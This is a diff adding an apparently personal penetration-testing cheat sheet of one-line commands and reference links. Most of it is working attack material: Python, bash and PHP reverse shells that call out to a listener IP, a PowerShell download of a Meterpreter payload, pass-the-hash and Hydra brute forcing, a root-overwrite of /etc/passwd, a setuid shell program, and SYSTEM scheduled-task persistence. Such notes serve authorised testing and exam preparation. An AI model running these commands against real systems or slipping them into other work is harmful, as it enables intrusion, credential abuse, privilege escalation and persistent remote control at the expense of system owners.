@@ -1,0 +1,117 @@
+nmap services and OS recon : nmap -sV -O <ip range>
+
+command to convert nmap xml file to html : xsltproc <filename.xml> -o <filename.html>
+
+http brute force medusa : medusa -h <host> -u <user> -P <wordlist> -M <module> -m <directory>
+
+cewl commands : cewl <url> -m <minimum lenght> -w <writes output file to path>
+
+john password improving : john --wordlist=<wordlist file> 
+directory recon : dirbuster
+
+create an scheduled task on windows : schtasks /Create /ru SYSTEM /sc MINUTE /MO 10 /tn megapwn /tr "\"C\\Windows\\system32\\SafreProgram.exe""
+
+pass hash to SMBHASH variable: export SMBHASH=<hash>
+
+pass the hash on windows : pth-winexe -U user //ip cmd
+
+file restriction bypass : https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf
+
+TTY shell after reverse shell connection (linux) : python -c 'import pty;pty.spawn("/bin/bash")'
+
+set PATH TERM and SHELL : export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+export TERM=xterm
+export SHELL=bash 
+
+gcc compilation : gcc -pthread <original file> -o <output file> -lcrypt | -Wl,--hash-style=both (limit the use of new libraries to compile)
+
+post exploitaiton cheatsheet https://guif.re/linuxeop#Post%20exploitation
+
+apache2 log tail : tail -f /var/log/apache2/access.log
+
+
+java shell msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
+
+Python to exe : https://medium.com/ethical-hacking-blog/converting-python-into-exe-files-on-kali-fdff53b81aad
+
+Windows privilege escalation cheatsheet : http://www.fuzzysecurity.com/tutorials/16.html
+
+
+Wmic : https://www.computerhope.com/wmic.htm
+
+windows priv escalation checker : https://github.com/pentestmonkey/windows-privesc-check
+
+Accesschk.exe old version : https://xor.cat/2017/09/05/sysinternals-accesschk-accepteula/
+
+RPC client enumeration : https://www.adampalmer.me/iodigitalsec/2013/08/10/windows-null-session-enumeration/
+
+nmap authenticated cdm shell : https://nmap.org/nsedoc/scripts/ms-sql-xp-cmdshell.html
+
+Linux privilege escalation guide : https://payatu.com/guide-linux-privilege-escalation/
+
+python reverse shell : -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOURIP>",<YOURLISTENINGPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+bash reverse shell : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.52 443 >/tmp/f
+
+priv escalation passwd : echo root::0:0:root:/root:/bin/bash > /etc/passwd
+
+LFI cheatsheet : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20inclusion#lfi-to-rce-via-phpinfo
+
+Windows priv escalation techniques : https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
+
+Powershell script to download files : -c "(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')"
+
+WMIC autologon query : reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+Empyre : https://github.com/EmpireProject/Empire
+
+List world writable directories in system : <?php $output= shell_exec("find / -maxdepth 3 -type d -perm -777");echo "<pre>$output</pre>";?>
+
+php reverse shell : <?php $output= shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.52 666 >/tmp/f");echo "<pre>$output</pre>";?>
+
+ms-sql brute force script nmap : nmap -p 445 --script ms-sql-brute --script-args mssql.instance-all,userdb=customuser.txt,passdb=custompass.txt <host>
+
+hydra ssh bruce force : hydra -L users.txt -P password.txt -vV -o ssh.log -s <port> -e ns IP ssh
+
+enable RDP from windows command line : reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+spawm bash shell C : #include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main(void)
+{
+setuid(0); setgid(0); system("/bin/bash");
+}
+
+sudo find privilege escalation : sudo find /etc/passwd -exec /bin/sh \;
+
+upgrade TTY shell :
+
+    Spawning bash with python:
+
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+
+    Background'ing the remote shell with CTRL-Z:
+
+user@remote:~$ ^Z
+
+    Getting ROWS and COLS within current terminal window:
+
+user@local:~$ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
+
+    Ignoring hotkeys in the local shell and getting back to the remote:
+
+user@local:~$ stty raw -echo; fg
+
+    Setting correct size for the remote shell (where ROWS and COLS are the values from the 3rd bullet):
+
+user@remote:~$ stty rows ROWS cols COLS
+
+    Adding some colors:
+
+user@remote:~$ export TERM=xterm-256color
+
+    Reloading bash to apply the TERM variable:
+
+user@remote:~$ exec /bin/bash
+
